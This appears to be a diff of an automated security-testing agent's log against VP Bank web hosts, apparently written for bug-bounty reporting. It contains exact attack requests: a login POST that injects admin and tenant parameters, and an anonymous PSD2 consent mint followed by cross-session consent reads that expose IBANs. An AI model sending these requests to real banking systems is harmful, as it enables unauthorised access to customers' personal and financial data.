+reasoning: fleet-wide overridden Users::SessionsController (3/3 venues, defaults 4/129/7); stage hidden fields pinned 7/false/0, 3× auth_token, _us_session+session_expiry pre-auth (baseline live this cycle, sign_in 200); failed-login axis negative (context NOT written pre-auth) so only success path unobserved; POST accepts injected params without validation error
+evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants ≠ `{}` or /admin/api/v1/users ≠ 401)
+verify_steps: HUMAN: GET /users/sign_in (fresh token) → POST email/password + 3 injected params + CSRF + _us_session → replay GET /api/v1/tenants + /admin/api/v1/users; diff vs `200 {}`/401
+impact: cross-tenant admin back-office session — onboarding PII, ident docs, wire status; HIGH
+testability: HUMAN_ONLY
+
+[HYP] Anonymous consent mint still possible → fully credential-free BOLA chain
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents
+confidence: 45
+reasoning: 09-05 anonymous POST → 201 (chain fully anon then); 09-17 re-mint used basic auth test:test; no code/service signal that anonymous mint was disabled; if live, mint→cross-read becomes credential-free end-to-end (cleanest reportable PoC)
+evidence_needed: anonymous POST /consents (no Authorization) → 201 new consentId; fresh anon session /status 200
+verify_steps: HUMAN: POST /psd2/berlin-group/v1/consents JSON {"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100} + X-Request-ID:<new uuid> + Content-Type:application/json, NO auth header → capture consentId → anon GET /consents/{id}/status
+impact: removes "attacker identity at mint" caveat from the BOLA report; MEDIUM (sandbox, synthetic data)
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+[FINAL] 1. [95] digital-onboarding-stage.vpbank.com/users/sign_in — valid-creds session-context injection (HUMAN_ONLY, standing)
+[FINAL] 2. [92] developer.vpbank.com/psd2/berlin-group/v1/consents/{id} — consent-object BOLA, re-confirmed 3 sessions this cycle (PASSIVE)
+[FINAL] 3. [45] developer.vpbank.com/psd2/berlin-group/v1/consents — anonymous-mint BOLA chain (HUMAN_ONLY)
+[PARKED] Fresh stage/prod bundle API-map diff: resolved NEGATIVE 09-17 (Klaro+DAB widget bloat; prod map unchanged) — confidence < 40, no new route signal
+[PARKED] api.vpbank.com any new vector: target exhausted 15+ cycles, uniform INVALID_REQUEST_RESOURCE 500, all leads dead
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: stage valid-creds POST — GET https://digital-onboarding-stage.vpbank.com/users/sign_in (fresh token+_us_session), POST `email/<valid_creds>`+`password` + `authenticity_token` + `user[email]&user[password]&user[tenant_id]=1&user[admin]=true&user[user_id]=1`; on success replay GET /api/v1/tenants and /admin/api/v1/users; diff vs anon `200 {}`/`401` baseline
+
+STEP 6 — LEARNING
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 consent-object BOLA): reused synthetic consent 799bf6a0…-readable across 3 independent anonymous sessions (status 200/object 200 w/IBAN, control random-uuid 404); header-less 400s are X-Request-ID artifacts; mechanism standing, deep-data axis not provisioned in sandbox
+[LEARN] REJECTED MISCONFIG @ developer.vpbank.com (prior 400 read as service change 09-12): header-less probes return 400 because X-Request-ID is mandatory — not an added authz gate; no service change
+
+STEP 7 — RISK
+[RISK] vp-bank-ag: 50 — highest-confidence standing finding (PSD2 consent-object BOLA) independently re-confirmed this cycle across a 3rd fresh anonymous session with clean 404 control; stage session-context injection surface still live at 95-confidence but remains HUMAN-bound (valid creds) for 10+ cycles; discovery gap closed — further movement rate-limited solely by unexecuted HUMAN_ONLY proofs (credential/authorized POSTs), not by surface.
